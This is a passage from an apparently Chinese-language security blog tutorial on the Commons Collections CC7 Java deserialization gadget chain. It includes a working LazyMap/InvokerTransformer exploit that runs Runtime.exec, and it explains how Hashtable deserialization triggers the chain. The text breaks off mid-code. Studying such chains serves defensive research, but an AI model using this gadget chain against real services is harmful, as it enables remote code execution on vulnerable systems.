+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>value.<span style=color:#a6e22e>equals</span>(m.<span style=color:#a6e22e>get</span>(key)))
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (ClassCastException unused) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (NullPointerException unused) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><h2 id=cc7-exp>CC7 EXP
+<a class=anchor href=#cc7-exp>#</a></h2><h3 id=lazymapget-部分的-exp>LazyMap.get() 部分的 EXP
+<a class=anchor href=#lazymapget-%e9%83%a8%e5%88%86%e7%9a%84-exp>#</a></h3><p>再复习一下从<code>LazyMap</code>开始的 EXP：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>,<span style=color:#66d9ef>null</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>,Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#66d9ef>null</span>,<span style=color:#66d9ef>null</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> hashMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(hashMap, chainedTransformer);
+</span></span><span style=display:flex><span>        lazyMap.<span style=color:#a6e22e>get</span>(<span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>());
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=结合入口类编写-exp>结合入口类编写 EXP
+<a class=anchor href=#%e7%bb%93%e5%90%88%e5%85%a5%e5%8f%a3%e7%b1%bb%e7%bc%96%e5%86%99-exp>#</a></h3><p>先来看<code>reconstitutionPut</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>reconstitutionPut</span>(Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;[]</span> tab, K key, V value)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> StreamCorruptedException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>StreamCorruptedException</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Makes sure the key is not already in the hashtable.</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// This should not happen in deserialized version.</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> hash <span style=color:#f92672>=</span> key.<span style=color:#a6e22e>hashCode</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> index <span style=color:#f92672>=</span> (hash <span style=color:#f92672>&amp;</span> 0x7FFFFFFF) <span style=color:#f92672>%</span> tab.<span style=color:#a6e22e>length</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span> e <span style=color:#f92672>=</span> tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> ; e <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> ; e <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>next</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ((e.<span style=color:#a6e22e>hash</span> <span style=color:#f92672>==</span> hash) <span style=color:#f92672>&amp;&amp;</span> e.<span style=color:#a6e22e>key</span>.<span style=color:#a6e22e>equals</span>(key)) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>StreamCorruptedException</span>();
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Creates the new entry.</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
+</span></span><span style=display:flex><span>            Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> (Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span>)tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>        tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Entry<span style=color:#f92672>&lt;&gt;</span>(hash, key, value, e);
+</span></span><span style=display:flex><span>        count<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>这里对传入的<code>Entry</code>对象数组进行遍历，并逐个调用<code>e.key.equals(key)</code>。再来联系一下<code>AbstractMap.equals()</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span>(Object o) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (o <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(o <span style=color:#66d9ef>instanceof</span> Map))
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span> m <span style=color:#f92672>=</span> (Map<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span>) o;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (m.<span style=color:#a6e22e>size</span>() <span style=color:#f92672>!=</span> size())
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            Iterator<span style=color:#f92672>&lt;</span>Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;&gt;</span> i <span style=color:#f92672>=</span> entrySet().<span style=color:#a6e22e>iterator</span>();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> (i.<span style=color:#a6e22e>hasNext</span>()) {
+</span></span><span style=display:flex><span>                Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> i.<span style=color:#a6e22e>next</span>();
+</span></span><span style=display:flex><span>                K key <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>getKey</span>();
+</span></span><span style=display:flex><span>                V value <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>getValue</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(m.<span style=color:#a6e22e>get</span>(key)<span style=color:#f92672>==</span><span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> m.<span style=color:#a6e22e>containsKey</span>(key)))
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>value.<span style=color:#a6e22e>equals</span>(m.<span style=color:#a6e22e>get</span>(key)))
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (ClassCastException unused) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (NullPointerException unused) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>如果我们可以控制<code>e.key.equals(key)</code>的<code>key</code>，就能控制<code>AbstractMap.equals()</code>中的<code>m</code>。</p><p>接下来回到<code>readObject</code>方法，再看一次源码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> s)
+</span></span><span style=display:flex><span>         <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read in the length, threshold, and loadfactor</span>
+</span></span><span style=display:flex><span>        s.<span style=color:#a6e22e>defaultReadObject</span>();
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> origlength <span style=color:#f92672>=</span> s.<span style=color:#a6e22e>readInt</span>();<span style=color:#75715e>//Entry数组的元素个数</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> elements <span style=color:#f92672>=</span> s.<span style=color:#a6e22e>readInt</span>();<span style=color:#75715e>//一个Entry中的键值对个数</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> length <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>)(elements <span style=color:#f92672>*</span> loadFactor) <span style=color:#f92672>+</span> (elements <span style=color:#f92672>/</span> 20) <span style=color:#f92672>+</span> 3;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (length <span style=color:#f92672>&gt;</span> elements <span style=color:#f92672>&amp;&amp;</span> (length <span style=color:#f92672>&amp;</span> 1) <span style=color:#f92672>==</span> 0)
+</span></span><span style=display:flex><span>            length<span style=color:#f92672>--</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (origlength <span style=color:#f92672>&gt;</span> 0 <span style=color:#f92672>&amp;&amp;</span> length <span style=color:#f92672>&gt;</span> origlength)
+</span></span><span style=display:flex><span>            length <span style=color:#f92672>=</span> origlength;
+</span></span><span style=display:flex><span>        table <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;[</span>length<span style=color:#f92672>]</span>;   <span style=color:#75715e>//新建一个Entry，用来存放反序列化之前的键值对</span>
+</span></span><span style=display:flex><span>        threshold <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>)Math.<span style=color:#a6e22e>min</span>(length <span style=color:#f92672>*</span> loadFactor, MAX_ARRAY_SIZE <span style=color:#f92672>+</span> 1);
+</span></span><span style=display:flex><span>        count <span style=color:#f92672>=</span> 0;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (; elements <span style=color:#f92672>&gt;</span> 0; elements<span style=color:#f92672>--</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
+</span></span><span style=display:flex><span>                K key <span style=color:#f92672>=</span> (K)s.<span style=color:#a6e22e>readObject</span>();  <span style=color:#75715e>//反序列化键</span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
+</span></span><span style=display:flex><span>                V value <span style=color:#f92672>=</span> (V)s.<span style=color:#a6e22e>readObject</span>();<span style=color:#75715e>//反序列化值</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            reconstitutionPut(table, key, value);<span style=color:#75715e>//重构整个Entry</span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>根据我的注释就很好理解这段代码的主要部分了：java 是通过新建然后填充从而实现反序列化的，所以对于一个<code>Hashtable</code>，反序列化是就是先把整个框架搭建好，然后调用<code>reconstitutionPut</code>来填充这个新的<code>Entry</code>对象。然后我们再来关注<code>reconstitutionPut</code>方法中发生了什么：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>reconstitutionPut</span>(Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;[]</span> tab, K key, V value)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> StreamCorruptedException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>StreamCorruptedException</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> hash <span style=color:#f92672>=</span> key.<span style=color:#a6e22e>hashCode</span>();<span style=color:#75715e>//用hashCode计算一下key应该放在什么位置</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> index <span style=color:#f92672>=</span> (hash <span style=color:#f92672>&amp;</span> 0x7FFFFFFF) <span style=color:#f92672>%</span> tab.<span style=color:#a6e22e>length</span>;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    	<span style=color:#75715e>//遍历这个位置上的链表，检查是否有重复</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span> e <span style=color:#f92672>=</span> tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> ; e <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> ; e <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>next</span>) {
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//先满足hash相同，然后equals返回true,则认为键重复</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ((e.<span style=color:#a6e22e>hash</span> <span style=color:#f92672>==</span> hash) <span style=color:#f92672>&amp;&amp;</span> e.<span style=color:#a6e22e>key</span>.<span style=color:#a6e22e>equals</span>(key)) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>StreamCorruptedException</span>();
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// 没有重复就创建新的Entry并放入链表头部</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
+</span></span><span style=display:flex><span>        Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> (Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span>)tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>        tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Entry<span style=color:#f92672>&lt;&gt;</span>(hash, key, value, e);
+</span></span><span style=display:flex><span>        count<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>根据我的注释，大致能理解这个函数的具体运行逻辑了。</p><p>我们来看一下，如果我们只在<code>Hashtable</code>中放一个键值对，传入<code>reconstitutionPut</code>方法的<code>Entry</code>对象就是空，for 循环根本进不去，所以无法触发<code>equals</code>方法。</p><p>如果我们放两个键值对，在第一个键值对传入后<code>e</code>这个<code>Entry</code>对象已经存了第一个键值对，然后第二次调用<code>reconstitutionPut</code>方法的时候<code>tab</code>就有了第一个键值对，然后计算第二个键的哈希，如果第二个哈希和第一个哈希是一样的，就会调用<code>equals</code>。</p><p>这也是为什么 yso 的链子中会放两个<code>LazyMap</code>且存放在<code>LazyMap</code>的键分别为<code>yy</code>和<code>zZ</code>。</p><p>当我们把两个<code>LazyMap</code>放到<code>Hashtable</code>中后，<code>e.key</code>就是第一个<code>LazyMap</code>，此时就会调用<code>LazyMap</code>的<code>equals</code>方法，但是这个方法<code>LazyMap</code>没有实现，所以就去调用了父类<code>AbstractMapDecorator</code>的<code>equals</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span>(Object object) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (object <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> map.<span style=color:#a6e22e>equals</span>(object);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>这里调用了<code>map</code>属性的<code>equals</code>方法，关注一下这个<code>map</code>属性，在<code>LazyMap</code>被实例化时已经给<code>map</code>属性赋值了：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#a6e22e>LazyMap</span>(Map map, Factory factory) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>(map);<span style=color:#75715e>//给map赋值</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (factory <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;Factory must not be null&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>factory</span> <span style=color:#f92672>=</span> FactoryTransformer.<span style=color:#a6e22e>getInstance</span>(factory);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>AbstractMapDecorator</span>(Map map) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (map <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;Map must not be null&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>map</span> <span style=color:#f92672>=</span> map;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>而在我们构造第一个<code>LazyMap</code>时，第一个参数是一个普通的<code>HashMap</code>，所以就变成了<code>HashMap.equals(lazyMap2)</code>。而<code>HashMap</code>也没有重写<code>equals</code>方法，所以就会调用父类<code>AbstractMap</code>的<code>equals</code>方法，所以就变成了<code>AbstractMap.equals(lazyMap2)</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span>(Object o) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (o <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(o <span style=color:#66d9ef>instanceof</span> Map))
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span> m <span style=color:#f92672>=</span> (Map<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span>) o;   <span style=color:#75715e>//注意这里！！！</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (m.<span style=color:#a6e22e>size</span>() <span style=color:#f92672>!=</span> size())
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            Iterator<span style=color:#f92672>&lt;</span>Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;&gt;</span> i <span style=color:#f92672>=</span> entrySet().<span style=color:#a6e22e>iterator</span>();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> (i.<span style=color:#a6e22e>hasNext</span>()) {
+</span></span><span style=display:flex><span>                Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> i.<span style=color:#a6e22e>next</span>();
+</span></span><span style=display:flex><span>                K key <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>getKey</span>();
+</span></span><span style=display:flex><span>                V value <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>getValue</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(m.<span style=color:#a6e22e>get</span>(key)<span style=color:#f92672>==</span><span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> m.<span style=color:#a6e22e>containsKey</span>(key)))
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>value.<span style=color:#a6e22e>equals</span>(m.<span style=color:#a6e22e>get</span>(key)))
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (ClassCastException unused) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (NullPointerException unused) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>此时传入的<code>lazyMap2</code>就赋值给了变量<code>m</code>，在后续就调用了<code>LazyMap</code>的<code>get</code>方法，实现了整个链子。</p><p>但至此还有一个问题，在 yso 的链子中，还把一开始的<code>yy</code>给删除了。</p><p>回到序列化之前，我们要把两个<code>LazyMap</code>放到<code>Hashtable</code>中，代码大致为：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>Hashtable ht <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Hashtable();
